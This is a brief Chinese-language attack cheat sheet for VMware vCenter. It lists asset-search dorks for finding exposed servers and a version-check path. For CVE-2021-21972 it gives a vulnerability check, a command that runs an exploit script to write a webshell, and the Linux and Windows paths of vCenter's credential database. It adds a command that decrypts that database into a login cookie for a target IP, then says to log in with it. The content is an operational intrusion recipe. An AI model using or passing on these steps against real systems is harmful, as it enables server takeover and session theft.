# vCenter 漏洞

## 资产搜索
title="+ ID_VC_Welcome +"  或者  app="vmware-vCenter"

## POC
### 查看版本信息
`/sdk/vimServiceVersions.xml`

### CVE-2021-21972
VMware vCenter Server: 7.0/6.7/6.5
- `/ui/vropspluginui/rest/services/updateova` 响应为405表示漏洞存在
- 使用脚本工具写入webshell:`python3 CVE-2021-21972 -url`
- vCenter cookie 保存位置：  
```
LINUX : /storage/db/vmware-vmdir/data.mdb
WINDOWS : C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
```
- 使用脚本解密cookie文件：`python3 vcenter_saml_login.py -p data.mdb -t x.x.x.x`  
- 数据包添加cookie后登陆  
  
参考：https://github.com/NS-Sp4ce/CVE-2021-21972